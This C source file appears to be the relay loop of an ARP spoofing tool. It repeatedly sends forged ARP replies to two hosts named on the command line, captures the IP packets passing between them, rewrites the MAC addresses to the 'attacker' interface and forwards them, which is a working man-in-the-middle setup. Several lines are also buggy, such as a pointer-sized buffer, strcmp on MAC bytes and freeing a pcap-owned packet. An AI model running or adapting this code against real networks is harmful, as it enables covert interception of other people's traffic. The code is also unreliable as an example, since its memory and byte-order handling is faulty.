#include <sfdafx.h>
#include <send_arp.h>
#include <utill.h>


void Send_IP_REL(pcap_t* handle,pcap_pkthdr*header,ARP *Tar_ARP_Pac, ARP *Sen_ARP_Pac,
                 const u_char* target_packet,const char * dev,const char *argv[])
{
    const u_char* packet;
    u_char sender_mac[6];
    u_char * target_copy=(u_char *) malloc(sizeof(target_packet)*60);
    memcpy(target_copy,target_packet,sizeof (target_packet)*60);// 60== arp_size


    unsigned char * Attacker_mac = find_Attacker_Mac(dev);
    while (true) {
            char key='\0';
           int res = pcap_next_ex(handle, &header, &packet);
           if (res == 0) continue;
           if (res == -1 || res == -2)
           {
               printf("Couldn't read packet!\n");
               break;
           }

               u_char * copy_packet= (u_char *)packet;
               uint16_t Eth_type = uint16_t((copy_packet[12]<<8)| copy_packet[13]);
               uint32_t SIP= uint32_t((copy_packet[26]<<24 )| (copy_packet[27]<<16)| (copy_packet[28] <<8)| copy_packet[29]);
               uint32_t DIP=  uint32_t((copy_packet[30]<<24 )| (copy_packet[31]<<16)| (copy_packet[32] <<8)| copy_packet[33]);
               uint8_t Dst_mac[6];
               for (int i=0;i<6;i++) {Dst_mac[i] =copy_packet[i];}
               Send_ARP_ToSender(handle,Sen_ARP_Pac,sizeof(ARP));
               Send_ARP_ToTarget(handle,Tar_ARP_Pac,sizeof(ARP));
               printf("Success 3!(Press q to exit)\n");
                sleep(1);
           if(IP_Number== Eth_type&& ntohl(SIP)==inet_addr(argv[2]) && ntohl(DIP) == inet_addr(argv[3])
                   && strcmp((const char *)Dst_mac,(const char *)Attacker_mac)==0 )
                {
                    printf("Success 4!\n");
                    //printf("Tar3_mac:");
                    //for(int i=0; i<6;i++) sender_mac[i] = target_copy[i];
                    for(int i=0; i<6; i++)copy_packet[i] =target_copy[i+6];
                    //printf("copy_packet:");
                    for(int i=0; i<6; i++) copy_packet[i+6]= Attacker_mac[i];

                    printf("cap-len:%d",header->caplen);
                    pcap_sendpacket(handle,(unsigned char *)copy_packet, sizeof(u_char) *header->caplen);

                    printf("Packet Relay1!(Press q to exit)\n\n");
                    key = getKey();
                    if(key == 'q')
                    {
                    printf("pressed Your key : %c! Success quit \n\n",key);
                    free(target_copy);
                    free(copy_packet);
                    break;
                    }
                    else if (key!='q' && key != '\0') {
                        fflush(stdin);
                        printf("Pressed incorrect key= %c! Try again\n",key);
;                    }
                    else
                    {
                    fflush(stdin);
                    continue;
                    }
                }
           else if(IP_Number== Eth_type &&  ntohl(SIP)==inet_addr(argv[3]) && ntohl(DIP) == inet_addr(argv[2]))
                   //&& strcmp((const char *)Dst_mac,(const char *)Attacker_mac)==0)
           {
               printf("Success 5!\n");
               //printf("Tar3_mac:");
               for(int i=0; i<6; i++)copy_packet[i] =target_copy[i];
               //printf("copy_packet:");
               for(int i=0; i<6; i++) copy_packet[i+6]= Attacker_mac[i];
               printf("cap-len2:%d",header->caplen);
               pcap_sendpacket(handle,(unsigned char *)copy_packet, sizeof(u_char) *header->caplen);
               printf("Packet Relay2!(Press q to exit)\n\n");
               key = getKey();
               if(key == 'q')
               {
               printf("pressed Your key : %c! Success quit \n\n",key);
               free(target_copy);
               free(copy_packet);
               break;
               }
               else if (key!='q' && key != '\0') {
                   fflush(stdin);
                   printf("Pressed incorrect key= %c! Try again\n",key);
;                    }
               else
               {
               fflush(stdin);
               continue;
               }
           }
           else {
               key = getKey();
               if(key == 'q')
               {
               printf("pressed Your key : %c! Success quit \n\n",key);
               free(target_copy);
               free(copy_packet);
               break;
               }
               else if (key!='q' && key != '\0') {
                   fflush(stdin);
                   printf("Pressed incorrect key= %c! Try again\n\n",key);
;                    }
               else
               {
               fflush(stdin);
               continue;
               }
                  }

       }
}
